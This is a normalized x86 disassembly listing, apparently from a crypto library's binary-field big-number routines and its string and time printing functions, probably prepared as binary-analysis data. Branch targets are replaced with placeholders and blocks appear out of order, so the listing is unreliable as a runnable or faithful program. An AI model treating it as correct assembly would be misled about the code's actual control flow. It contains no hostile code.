mov ebx [ esp + 0x28 ]
mov eax [ esi ]
push edi
push ecx
push ebx
push ebx
push esi
call [ eax + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
mov edx [ esi ]
push edi
push ebx
push ebp
push eax
push esi
call [ edx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
push ebp
push ebx
push ebx
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esi ]
push edi
push ebx
push ebx
push esi
call [ ecx + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esi ]
push edi
push eax
push ebx
push ebp
push esi
call [ edx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x34 ]
push ecx
push ebp
push ebp
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
sub_10065f30
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov ecx [ eax + 0x4 ]
push edi
cmp ecx [ ebx + 0x4 ]
jge r-xdata
mov edi eax
mov edi ebx
mov ebx eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
xor eax eax
test ecx ecx
jle r-xdata
push eax
push esi
call sub_10029af0
add esp 0x8
mov esi [ esp + 0x10 ]
mov eax [ edi + 0x4 ]
cmp eax [ esi + 0x8 ]
jle r-xdata
cmp eax [ edi + 0x4 ]
jge r-xdata
push ebp
mov edi [ edi + 0x4 ]
test edi edi
mov [ esi + 0x4 ] edi
jle r-xdata
mov edx [ edi ]
mov ecx [ esi ]
mov edx [ edx + eax * 4 ]
mov [ ecx + eax * 4 ] edx
mov ecx [ edi + 0x4 ]
inc eax
cmp eax ecx
jl r-xdata
mov edx [ edi ]
mov ecx [ ebx ]
mov edx [ edx + eax * 4 ]
mov ebp [ ecx + eax * 4 ]
mov ecx [ esi ]
xor edx ebp
mov [ ecx + eax * 4 ] edx
mov ecx [ ebx + 0x4 ]
inc eax
cmp eax ecx
jl r-xdata
pop ebp
pop edi
pop esi
mov eax 0x1
pop ebx
retn
mov eax [ esi ]
lea eax [ eax + edi * 4 - 0x4 ]
mov edx [ esi + 0x4 ]
dec edx
mov ecx edx
mov [ esi + 0x4 ] edx
test ecx ecx
jg r-xdata
mov ecx [ eax ]
sub eax 0x4
test ecx ecx
jne r-xdata
sub_10065fd0
mov eax 0x8
call sub_1001d0d0
push ebx
push esi
push edi
mov edi [ esp + 0x20 ]
cmp [ edi ] 0x0
jne r-xdata
mov esi [ esp + 0x1c ]
mov ebx [ esp + 0x18 ]
cmp esi ebx
je r-xdata
mov eax [ esp + 0x18 ]
push 0x0
push eax
call sub_10029cf0
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x8
retn
mov ecx [ edi ]
mov eax [ ebx + 0x4 ]
mov esi [ ebx ]
push ebp
shr ecx 0x5
dec eax
mov [ esp + 0x20 ] ecx
cmp eax ecx
mov [ esp + 0x10 ] eax
jle r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebx + 0x8 ]
cmp eax ecx
jg r-xdata
jne r-xdata
lea ebp [ eax * 4 ]
push eax
push ebx
call sub_10029af0
add esp 0x8
mov eax ebx
jmp r-xdata
mov eax [ ebx + 0x4 ]
pop ebp
test eax eax
jle r-xdata
mov ecx [ esp + 0x20 ]
mov eax [ edi ]
and eax 0x1f
mov edx [ esi + ecx * 4 ]
mov ecx eax
mov ebx edx
shr ebx cl
test ebx ebx
je r-xdata
lea ecx [ edi + 0x4 ]
mov [ esi + ebp ] 0x0
cmp [ ecx ] 0x0
je r-xdata
dec eax
sub ebp 0x4
mov [ esp + 0x10 ] eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
xor eax eax
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
add esp 0x8
retn
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x8
retn
mov edx [ ebx ]
lea eax [ edx + eax * 4 - 0x4 ]
mov ebx [ esp + 0x1c ]
mov ecx 0x20
sub ecx eax
test eax eax
je r-xdata
mov ecx [ esp + 0x20 ]
mov eax [ edi ]
mov edx ebp
and eax 0x1f
shl ecx 0x2
sub edx ecx
mov edi ebx
mov [ esp + 0x14 ] edx
mov edx ebp
sub edx ecx
mov ecx eax
shr edi cl
mov ecx [ edx + esi ]
xor ecx edi
test eax eax
mov [ edx + esi ] ecx
je r-xdata
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x20 ]
cmp eax ecx
jg r-xdata
mov edx [ esi + 0x4 ]
mov [ ebx + 0x4 ] edx
mov ecx [ esi ]
mov edx [ ebx ]
mov ecx [ ecx + eax * 4 ]
mov [ edx + eax * 4 ] ecx
mov ecx [ esi + 0x4 ]
inc eax
cmp eax ecx
jl r-xdata
mov edx [ ebx + 0x4 ]
dec edx
mov ecx edx
mov [ ebx + 0x4 ] edx
test ecx ecx
jg r-xdata
mov ecx [ esp + 0x20 ]
mov [ esi + ecx * 4 ] 0x0
mov eax [ esp + 0x20 ]
shl edx cl
shr edx cl
mov [ esi + eax * 4 ] edx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edi [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
mov ecx ebp
lea edi [ edx * 4 ]
mov edx ebp
sub ecx edi
sub edx edi
add ecx 0xfffffffc
mov [ esp + 0x14 ] ecx
mov ecx 0x20
sub ecx eax
mov eax [ edx + esi - 0x4 ]
shl ebx cl
xor ebx eax
mov [ edx + esi - 0x4 ] ebx
cdq
and edx 0x1f
mov ecx edi
add eax edx
mov edx [ esp + 0x10 ]
sar eax 0x5
sub edx eax
mov eax ebx
shr eax cl
mov ecx [ esi + edx * 4 ]
xor ecx eax
test edi edi
mov [ esi + edx * 4 ] ecx
je r-xdata
dec edi
or edi 0xffffffe0
inc edi
mov ebx [ esi + ebp ]
test ebx ebx
jne r-xdata
mov ebx [ esp + 0x1c ]
mov ecx [ eax ]
sub eax 0x4
test ecx ecx
jne r-xdata
mov ebp eax
mov edx [ esi ]
lea eax [ edi + 0x4 ]
xor edx ebx
mov [ esi ] edx
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0x24 ]
add ecx 0x4
mov [ esp + 0x14 ] ecx
cmp [ ecx ] 0x0
jne r-xdata
mov ecx 0x20
mov eax ebx
sub ecx edi
shl eax cl
xor [ esi + edx * 4 - 0x4 ] eax
mov ecx [ ebp + 0x4 ]
add ebp 0x4
test ecx ecx
mov eax ebp
jne r-xdata
test edi edi
je r-xdata
mov eax [ edi ]
mov edx [ ecx ]
sub eax edx
mov edi eax
and edi 0x8000001f
jns r-xdata
mov ecx [ eax ]
mov edi ebx
mov eax ecx
and ecx 0x1f
shr eax 0x5
shl edi cl
mov edx ecx
mov ecx [ esi + eax * 4 ]
xor ecx edi
mov edi ebx
mov [ esi + eax * 4 ] ecx
mov ecx 0x20
sub ecx edx
shr edi cl
test edx edx
je r-xdata
mov edi [ esp + 0x24 ]
jmp r-xdata
xor [ esi + eax * 4 + 0x4 ] edi
sub_10066230
mov eax 0x30
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x40 ]
push esi
mov esi [ esp + 0x40 ]
cmp esi ebx
mov [ esp + 0x14 ] 0x0
jne r-xdata
push ebp
mov ebp [ esp + 0x50 ]
push edi
push ebp
call sub_1002dd20
push ebp
call sub_1002de70
mov edi eax
add esp 0x8
test edi edi
mov [ esp + 0x14 ] edi
je r-xdata
mov eax [ esp + 0x4c ]
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x3c ]
push eax
push ecx
push esi
push edx
call sub_10066600
add esp 0x10
pop esi
pop ebx
add esp 0x30
retn
push ebp
call sub_1002de00
mov eax [ esp + 0x20 ]
add esp 0x4
pop edi
pop ebp
pop esi
pop ebx
add esp 0x30
retn
mov eax [ ebx + 0x4 ]
mov ecx [ esi + 0x4 ]
lea esi [ eax + ecx + 0x4 ]
mov eax [ edi + 0x8 ]
cmp esi eax
jg r-xdata
push esi
push edi
call sub_10029af0
add esp 0x8
mov eax edi
jmp r-xdata
xor eax eax
mov [ edi + 0x4 ] esi
test esi esi
jle r-xdata
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
xor ecx ecx
test eax eax
mov [ esp + 0x18 ] ecx
jle r-xdata
mov edx [ edi ]
inc eax
cmp eax esi
mov [ edx + eax * 4 - 0x4 ] 0x0
jl r-xdata
mov eax [ edi + 0x4 ]
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ esp + 0x50 ]
mov ecx [ esp + 0x44 ]
push eax
push edi
push ecx
call sub_10065fd0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ edi ]
lea eax [ ecx + eax * 4 - 0x4 ]
mov edx [ ebx ]
lea ebp [ ecx * 4 ]
lea ebx [ ecx + 0x1 ]
mov esi [ edx + ebp ]
cmp ebx eax
mov [ esp + 0x20 ] esi
jne r-xdata
mov [ esp + 0x1c ] 0x1
mov edx [ edi + 0x4 ]
dec edx
mov ecx edx
mov [ edi + 0x4 ] edx
test ecx ecx
jg r-xdata
mov eax [ edx + ebp + 0x4 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x10 ] 0x0
jmp r-xdata
mov edx [ eax ]
sub eax 0x4
test edx edx
jne r-xdata
mov edx [ esp + 0x4c ]
add ecx 0x2
mov [ esp + 0x18 ] ecx
mov eax [ edx + 0x4 ]
cmp ecx eax
jl r-xdata
mov ecx [ esp + 0x10 ]
xor ecx esi
mov [ esp + 0x24 ] ecx
mov edx [ esp + 0x48 ]
xor ebx ebx
mov eax [ edx + 0x4 ]
test eax eax
jle r-xdata
mov ebx [ esp + 0x4c ]
mov ebp [ esp + 0x54 ]
mov esi [ ecx + ebx * 4 + 0x4 ]
xor esi esi
jmp r-xdata
mov edx [ esp + 0x14 ]
mov edi [ eax ]
add eax 0x4
mov edx [ edx ]
xor [ edx + ecx ] edi
add edx ecx
add ecx 0x4
dec esi
jne r-xdata
mov eax [ esp + 0x48 ]
add ebx 0x2
add ebp 0x8
mov eax [ eax + 0x4 ]
cmp ebx eax
jl r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x38 ]
push eax
push esi
lea edx [ esp + 0x44 ]
push ecx
push edx
call sub_10066470
mov eax [ esp + 0x30 ]
lea ecx [ esp + 0x40 ]
push eax
push edi
lea edx [ esp + 0x4c ]
push ecx
push edx
call sub_10066470
mov eax [ esp + 0x44 ]
xor esi edi
push eax
lea ecx [ esp + 0x50 ]
push esi
lea edx [ esp + 0x50 ]
push ecx
push edx
call sub_10066470
mov ecx [ esp + 0x58 ]
mov edx [ esp + 0x64 ]
mov edi [ esp + 0x68 ]
mov esi [ esp + 0x60 ]
mov eax ecx
xor esi ecx
xor eax edx
mov edx [ esp + 0x6c ]
xor eax edi
mov edi [ esp + 0x5c ]
xor eax edx
xor esi edi
xor esi eax
add esp 0x30
xor esi edx
mov [ esp + 0x38 ] eax
mov [ esp + 0x34 ] esi
mov ecx ebp
lea eax [ esp + 0x30 ]
mov esi 0x4
mov ecx [ esp + 0x48 ]
lea edx [ ebx + 0x1 ]
cmp edx eax
mov ecx [ ecx ]
mov edi [ ecx + ebx * 4 ]
jne r-xdata
mov edi [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
sub_10066470
mov eax 0x20
call sub_1001d0d0
mov eax [ esp + 0x2c ]
push ebx
mov ebx eax
and eax 0x3fffffff
push esi
mov [ esp + 0xc ] eax
lea edx [ eax + eax ]
mov [ esp + 0x8 ] 0x0
mov esi edx
mov [ esp + 0x10 ] edx
xor esi eax
lea ecx [ edx + edx ]
mov [ esp + 0x14 ] esi
mov [ esp + 0x18 ] ecx
mov esi ecx
xor ecx edx
mov [ esp + 0x20 ] ecx
xor ecx eax
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x38 ]
xor esi eax
mov eax ecx
shr eax 0x3
mov edx ecx
and eax 0x7
and edx 0x7
mov [ esp + 0x1c ] esi
mov esi [ esp + eax * 4 + 0x8 ]
push edi
mov eax [ esp + edx * 4 + 0xc ]
mov edx ecx
shr edx 0x6
and edx 0x7
lea edi [ esi * 8 ]
xor eax edi
mov edx [ esp + edx * 4 + 0xc ]
mov edi edx
shr esi 0x1d
shr edx 0x1a
xor esi edx
mov edx ecx
shr edx 0x9
and edx 0x7
shl edi 0x6
mov edx [ esp + edx * 4 + 0xc ]
xor eax edi
mov edi edx
shr edx 0x17
xor esi edx
mov edx ecx
shr edx 0xc
and edx 0x7
shl edi 0x9
mov edx [ esp + edx * 4 + 0xc ]
xor eax edi
mov edi edx
shr edx 0x14
xor esi edx
mov edx ecx
shr edx 0xf
and edx 0x7
shl edi 0xc
mov edx [ esp + edx * 4 + 0xc ]
xor eax edi
mov edi edx
shr edx 0x11
xor esi edx
mov edx ecx
shr edx 0x12
and edx 0x7
shl edi 0xf
mov edx [ esp + edx * 4 + 0xc ]
xor eax edi
mov edi edx
shl edi 0x12
shr edx 0xe
shr ebx 0x1e
xor eax edi
xor esi edx
mov edx ecx
shr edx 0x15
and edx 0x7
mov edx [ esp + edx * 4 + 0xc ]
mov edi edx
shr edx 0xb
xor esi edx
mov edx ecx
shr edx 0x18
and edx 0x7
shl edi 0x15
mov edx [ esp + edx * 4 + 0xc ]
xor eax edi
mov edi edx
shr edx 0x8
xor esi edx
mov edx ecx
shr edx 0x1b
and edx 0x7
shl edi 0x18
mov edx [ esp + edx * 4 + 0xc ]
xor eax edi
mov edi edx
shr edx 0x5
xor esi edx
mov edx ecx
shr edx 0x1e
shl edi 0x1b
mov edx [ esp + edx * 4 + 0xc ]
xor eax edi
mov edi edx
shl edi 0x1e
shr edx 0x2
xor eax edi
xor esi edx
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov edx ecx
shl edx 0x1e
xor eax edx
mov edx ecx
shr edx 0x2
xor esi edx
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x34 ]
pop edi
mov [ ecx ] esi
pop esi
mov [ edx ] eax
pop ebx
add esp 0x20
retn
mov edx ecx
shl edx 0x1f
shr ecx 0x1
xor eax edx
xor esi ecx
sub_10066600
mov eax 0x4
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x18 ]
push ebp
push esi
xor ebp ebp
push ebx
mov [ esp + 0x10 ] ebp
call sub_1002dd20
push ebx
call sub_1002de70
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ esi + 0x8 ]
push edi
mov edi [ esp + 0x1c ]
mov eax [ edi + 0x4 ]
shl eax 0x1
cmp eax ecx
jg r-xdata
pop esi
pop ebp
pop ebx
pop ecx
retn
push eax
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
push ebx
call sub_1002de00
add esp 0x4
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov ecx [ edi + 0x4 ]
dec ecx
js r-xdata
test eax eax
je r-xdata
mov edi [ edi + 0x4 ]
shl edi 0x1
test edi edi
mov [ esi + 0x4 ] edi
jle r-xdata
mov eax [ edi ]
mov eax [ eax + ecx * 4 ]
mov edx eax
mov ebp eax
shr edx 0x18
shr ebp 0x1c
and edx 0xf
mov ebp [ ebp * 4 + r--data ]
mov edx [ edx * 4 + r--data ]
shl ebp 0x8
or edx ebp
mov ebp eax
shr ebp 0x14
and ebp 0xf
shl edx 0x8
or edx [ ebp * 4 + r--data ]
shr eax 0x10
and eax 0xf
shl edx 0x8
mov ebp [ eax * 4 + r--data ]
mov eax [ esi ]
or edx ebp
mov [ eax + ecx * 8 + 0x4 ] edx
mov edx [ edi ]
mov eax [ edx + ecx * 4 ]
mov edx eax
mov ebp eax
shr edx 0xc
and edx 0xf
shr ebp 0x8
mov edx [ edx * 4 + r--data ]
and ebp 0xf
shl edx 0x8
or edx [ ebp * 4 + r--data ]
mov ebp eax
shr ebp 0x4
and ebp 0xf
and eax 0xf
shl edx 0x8
or edx [ ebp * 4 + r--data ]
mov ebp [ eax * 4 + r--data ]
mov eax [ esi ]
shl edx 0x8
or edx ebp
mov [ eax + ecx * 8 ] edx
dec ecx
jns r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x18 ]
push eax
push esi
push ecx
call sub_10065fd0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esi ]
lea eax [ ecx + edi * 4 - 0x4 ]
mov ebp [ esp + 0x10 ]
mov ebp 0x1
mov edx [ esi + 0x4 ]
dec edx
mov ecx edx
mov [ esi + 0x4 ] edx
test ecx ecx
jg r-xdata
mov edx [ eax ]
sub eax 0x4
test edx edx
jne r-xdata
sub_10066760
mov eax 0x1c
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x38 ]
push edi
push esi
mov [ esp + 0x28 ] 0x0
call sub_1002dd20
push esi
call sub_1002de70
mov ebx eax
push esi
mov [ esp + 0x34 ] ebx
call sub_1002de70
push esi
mov [ esp + 0x2c ] eax
call sub_1002de70
push esi
mov ebp eax
call sub_1002de70
mov edi eax
add esp 0x14
test edi edi
mov [ esp + 0x10 ] edi
je r-xdata
push esi
call sub_1002de00
mov eax [ esp + 0x28 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
push 0x1
push ebx
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x38 ]
push eax
call sub_10029870
push 0x1ac
lea ecx [ eax * 4 ]
push r--data
push ecx
mov [ esp + 0x30 ] eax
call sub_1001d4c0
add esp 0x10
mov [ esp + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x38 ]
xor esi esi
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor esi esi
jmp r-xdata
push esi
push eax
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
push 0x1b0
push r--data
push 0x6a
push 0x83
push 0x3
call sub_1001de60
add esp 0x14
mov edx [ esp + 0x38 ]
mov edi [ edx + 0x4 ]
dec edi
js r-xdata
mov esi [ esp + 0x3c ]
mov esi [ esp + 0x38 ]
push esi
push edi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax edi
shl eax 0x5
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov edi [ esp + 0x10 ]
cmp esi [ esp + 0x20 ]
jg r-xdata
mov ecx [ esp + 0x14 ]
dec edi
sub ecx 0x20
test edi edi
mov [ esp + 0x14 ] ecx
jge r-xdata
mov eax [ esp + 0x18 ]
mov ecx 0x80000000
mov edx 0x1f
lea eax [ eax + esi * 4 ]
mov eax [ ebp + 0x4 ]
test eax eax
jle r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x34 ]
push ecx
push edx
push ebp
call sub_10065fd0
mov edi [ esp + 0x1c ]
add esp 0xc
mov esi eax
jmp r-xdata
mov eax [ esp + 0x38 ]
mov ecx [ eax ]
cmp [ ecx + edi * 4 ] 0x0
je r-xdata
shr ecx 0x1
dec edx
jns r-xdata
cmp esi [ esp + 0x20 ]
jge r-xdata
push ebp
push ebp
call sub_10035de0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp ]
test [ ecx ] 0x1
jne r-xdata
mov eax [ esp + 0x18 ]
push eax
call sub_1001d740
add esp 0x4
test esi esi
je r-xdata
mov ebx [ esp + 0x38 ]
mov ebx [ ebx ]
test [ ebx + edi * 4 ] ecx
je r-xdata
mov ebx [ esp + 0x28 ]
inc esi
add eax 0x4
mov ebx [ esp + 0x14 ]
add ebx edx
mov [ eax ] ebx
mov eax [ ebx + 0x4 ]
test eax eax
jle r-xdata
mov eax [ ebp + 0x4 ]
mov esi 0x1
cmp eax esi
jne r-xdata
push ebx
push ebx
call sub_10035de0
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebx ]
test [ edx ] 0x1
je r-xdata
push edi
call sub_10029870
push ebp
mov esi eax
call sub_10029870
add esp 0x8
cmp eax esi
jge r-xdata
mov eax [ ebp ]
cmp [ eax ] esi
je r-xdata
jmp r-xdata
push esi
push ebx
push ebx
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
push edi
push ebp
push ebp
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov eax ebp
mov ebp edi
mov [ esp + 0x10 ] eax
mov eax ebx
mov ebx [ esp + 0x1c ]
mov edi [ esp + 0x10 ]
mov [ esp + 0x1c ] eax
mov edx [ esp + 0x30 ]
push ebx
push edx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
push ecx
push ebx
push ebx
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov [ esp + 0x24 ] esi
mov esi [ esp + 0x38 ]
jmp r-xdata
sub_10066a00
mov eax 0xc
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x30 ]
xor esi esi
push edi
mov [ esp + 0x14 ] esi
call sub_1002dd20
push edi
call sub_1002de70
add esp 0x8
cmp eax esi
mov [ esp + 0x18 ] eax
je r-xdata
push edi
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ebx [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
push edi
push ebx
push ecx
push eax
call sub_10066760
add esp 0x10
test eax eax
je r-xdata
push ebx
call sub_10029870
push 0x1fb
lea edx [ eax * 4 ]
push r--data
push edx
mov [ esp + 0x38 ] eax
call sub_1001d4c0
mov ebp eax
add esp 0x10
cmp ebp esi
mov [ esp + 0x14 ] ebp
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
xor esi esi
jmp r-xdata
push esi
push ebx
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
push 0x1ff
push r--data
push 0x6a
push 0x85
push 0x3
call sub_1001de60
add esp 0x14
mov edi [ ebx + 0x4 ]
dec edi
js r-xdata
mov [ esp + 0x10 ] 0x1
test esi esi
je r-xdata
mov eax edi
shl eax 0x5
mov [ esp + 0x2c ] eax
mov edi [ esp + 0x30 ]
cmp esi [ esp + 0x28 ]
jg r-xdata
mov ecx [ esp + 0x2c ]
dec edi
sub ecx 0x20
test edi edi
mov [ esp + 0x2c ] ecx
jge r-xdata
mov ecx 0x80000000
mov edx 0x1f
lea eax [ ebp + esi * 4 ]
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x24 ]
push ebp
push edx
push eax
push ecx
call sub_10066230
mov edi [ esp + 0x44 ]
add esp 0x14
mov esi eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + edi * 4 ] 0x0
je r-xdata
shr ecx 0x1
dec edx
jns r-xdata
cmp esi [ esp + 0x28 ]
jge r-xdata
push ebp
call sub_1001d740
add esp 0x4
test esi esi
je r-xdata
mov ebp [ ebx ]
test [ ebp + edi * 4 ] ecx
je r-xdata
mov ebp [ esp + 0x14 ]
inc esi
add eax 0x4
mov ebp [ esp + 0x2c ]
add ebp edx
mov [ eax ] ebp
sub_10066b80
push ebp
mov ebp [ esp + 0x8 ]
push edi
xor edi edi
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop ebp
retn
push edi
push ebp
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
push esi
mov esi [ ebp + 0x4 ]
dec esi
js r-xdata
mov eax edi
pop esi
pop edi
pop ebp
retn
push ebx
mov ebx esi
shl ebx 0x5
dec esi
sub ebx 0x20
test esi esi
jge r-xdata
mov eax [ esp + 0x18 ]
mov ecx 0x80000000
mov edx 0x1f
lea eax [ eax + edi * 4 ]
mov eax [ ebp ]
cmp [ eax + esi * 4 ] 0x0
je r-xdata
pop ebx
mov ebp [ esp + 0x14 ]
shr ecx 0x1
dec edx
jns r-xdata
cmp edi [ esp + 0x1c ]
jge r-xdata
mov ebp [ ebp ]
test [ ebp + esi * 4 ] ecx
je r-xdata
inc edi
add eax 0x4
lea ebp [ ebx + edx ]
mov [ eax ] ebp
sub_10066c00
mov eax 0x18
call sub_1001d0d0
push esi
mov esi [ esp + 0x20 ]
test esi esi
mov [ esp + 0x4 ] 0x0
jne r-xdata
mov eax [ esp + 0x30 ]
push sub_10030070
push 0x14
push 0x13
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
mov [ esp + 0x1c ] eax
call sub_10023340
add esp 0x14
test eax eax
jne r-xdata
lea esi [ esp + 0x4 ]
mov dl [ eax + 0x10 ]
mov ecx [ eax + 0xc ]
test dl 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
push edx
mov edx [ esp + 0x2c ]
push eax
mov eax [ esp + 0x2c ]
push ecx
mov ecx [ esp + 0x38 ]
push ecx
push edx
push eax
push esi
call sub_100674c0
add esp 0x1c
jmp r-xdata
and ecx [ rw-data ]
mov ecx [ rw-data ]
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
and ecx 0x2806
push ecx
mov ecx [ esp + 0x28 ]
push edx
push eax
push ecx
push esi
call sub_10067490
add esp 0x14
lea edx [ esp + 0x8 ]
push edx
push eax
call sub_1001e620
add esp 0x8
test eax eax
jl r-xdata
test eax eax
jg r-xdata
mov eax [ esi ]
pop esi
add esp 0x18
retn
xor eax eax
pop esi
add esp 0x18
retn
push eax
mov eax [ rw-data ]
push eax
call sub_1001e7c0
add esp 0x8
test eax eax
je r-xdata
sub_10066ce0
mov eax 0x50
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x68 ]
test edi edi
jne r-xdata
mov eax [ edi ]
mov ebp [ edi + 0x8 ]
xor ecx ecx
xor esi esi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x50
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x50
retn
mov ebx [ esp + 0x64 ]
mov [ esp + ecx + 0x10 ] 0x2e
cmp al 0x20
jge r-xdata
mov eax [ edi ]
inc esi
cmp esi eax
jl r-xdata
lea eax [ esp + 0x10 ]
push ecx
push eax
push ebx
call sub_100209d0
add esp 0xc
test eax eax
jle r-xdata
mov [ esp + ecx + 0x10 ] al
jmp r-xdata
cmp al 0xa
je r-xdata
mov al [ esi + ebp ]
cmp al 0x7e
jg r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x50
retn
xor ecx ecx
inc ecx
cmp ecx 0x50
jl r-xdata
cmp al 0xd
jne r-xdata
push ecx
lea ecx [ esp + 0x14 ]
push ecx
push ebx
call sub_100209d0
add esp 0xc
test eax eax
jg r-xdata
sub_10066d80
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0x10 ]
push esi
xor edx edx
mov esi [ eax ]
mov eax [ eax + 0x8 ]
cmp esi 0xc
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] edx
jl r-xdata
mov edx [ esp + 0x10 ]
push 0xe
push r--data
push edx
call sub_100209d0
add esp 0xc
xor eax eax
pop esi
add esp 0x8
retn
cmp [ eax + esi - 0x1 ] 0x5a
jne r-xdata
mov cl [ eax + edx ]
cmp cl 0x39
jg r-xdata
mov [ esp + 0x4 ] 0x1
cmp cl 0x30
jl r-xdata
inc edx
cmp edx 0xc
jl r-xdata
movsx ecx [ eax ]
movsx edx [ eax + 0x1 ]
lea ecx [ ecx + ecx * 4 ]
lea ecx [ edx + ecx * 2 ]
movsx edx [ eax + 0x2 ]
lea ecx [ ecx + ecx * 4 ]
lea ecx [ edx + ecx * 2 ]
movsx edx [ eax + 0x3 ]
lea ecx [ ecx + ecx * 4 ]
lea ecx [ edx + ecx * 2 - 0xd050 ]
mov [ esp + 0x14 ] ecx
movsx ecx [ eax + 0x4 ]
lea edx [ ecx + ecx * 4 ]
movsx ecx [ eax + 0x5 ]
lea edx [ ecx + edx * 2 - 0x210 ]
cmp edx 0xc
jg r-xdata
cmp edx 0x1
jl r-xdata
movsx ecx [ eax + 0x6 ]
push ebx
push ebp
push edi
lea ecx [ ecx + ecx * 4 ]
movsx edi [ eax + 0x7 ]
movsx ebx [ eax + 0x9 ]
lea edi [ edi + ecx * 2 - 0x210 ]
cmp esi 0xe
movsx ecx [ eax + 0x8 ]
movsx ebp [ eax + 0xb ]
lea ecx [ ecx + ecx * 4 ]
lea ebx [ ebx + ecx * 2 - 0x210 ]
movsx ecx [ eax + 0xa ]
lea ecx [ ecx + ecx * 4 ]
lea ebp [ ebp + ecx * 2 - 0x210 ]
jl r-xdata
mov ecx [ esp + 0x14 ]
mov cl [ eax + 0xc ]
cmp cl 0x30
jl r-xdata
push eax
mov eax [ esp + 0x24 ]
push eax
push ecx
mov ecx [ edx * 4 + rw-data ]
mov edx [ esp + 0x28 ]
push ebp
push ebx
push edi
push ecx
push r--data
push edx
call sub_10026b40
add esp 0x24
xor ecx ecx
test eax eax
pop edi
pop ebp
setg cl
pop ebx
mov eax ecx
pop esi
add esp 0x8
retn
mov eax rw-data
cmp cl 0x39
jg r-xdata
mov al [ eax + 0xd ]
cmp al 0x30
jl r-xdata
cmp al 0x39
jg r-xdata
movsx ecx cl
movsx eax al
lea ecx [ ecx + ecx * 4 ]
lea ecx [ eax + ecx * 2 - 0x210 ]
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
mov eax r--data
jne r-xdata
sub_10066ef0
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0xc ]
push 0x0
push 0x0
push eax
mov [ esp + 0xc ] 0x0
call sub_10034190
mov edx eax
add esp 0xc
mov [ esp + 0xc ] edx
